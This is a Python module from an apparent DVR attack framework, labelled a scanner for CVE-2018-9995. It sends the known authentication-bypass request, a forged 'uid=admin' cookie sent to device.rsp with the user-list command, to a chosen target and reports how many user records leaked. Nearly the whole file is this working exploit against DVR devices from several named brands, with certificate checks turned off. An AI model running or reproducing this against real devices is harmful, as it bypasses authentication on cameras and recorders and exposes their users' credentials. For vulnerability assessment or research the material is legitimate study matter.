import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "cve_2018_9995/device_rsp_scan"
        self.description = "Authentication Bypass & Credentials Disclosure Scanner (CVE-2018-9995)."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        # Affichage informatif des marques concernées dans la console
        print("\033[1;36m[*] Ciblage multi-marques CVE-2018-9995 (Novo, CeNova, QSee, Pulnix, Securus, Night OWL, XVR 5-in-1...)\033[0m")
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/device.rsp?opt=user&cmd=list"
        else:
            url = f"{target.rstrip('/')}/device.rsp?opt=user&cmd=list"
            
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0",
            "Cookie": "uid=admin"
        }
        
        try:
            async with httpx.AsyncClient(timeout=6.0, verify=False) as client:
                response = await client.get(url, headers=headers)
                if response.status_code == 200 and "list" in response.text:
                    data = response.json()
                    if isinstance(data.get("list"), list):
                        return {
                            "vulnerable": True,
                            "details": f"Target is VULNERABLE to CVE-2018-9995. Leaked {len(data['list'])} user records."
                        }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
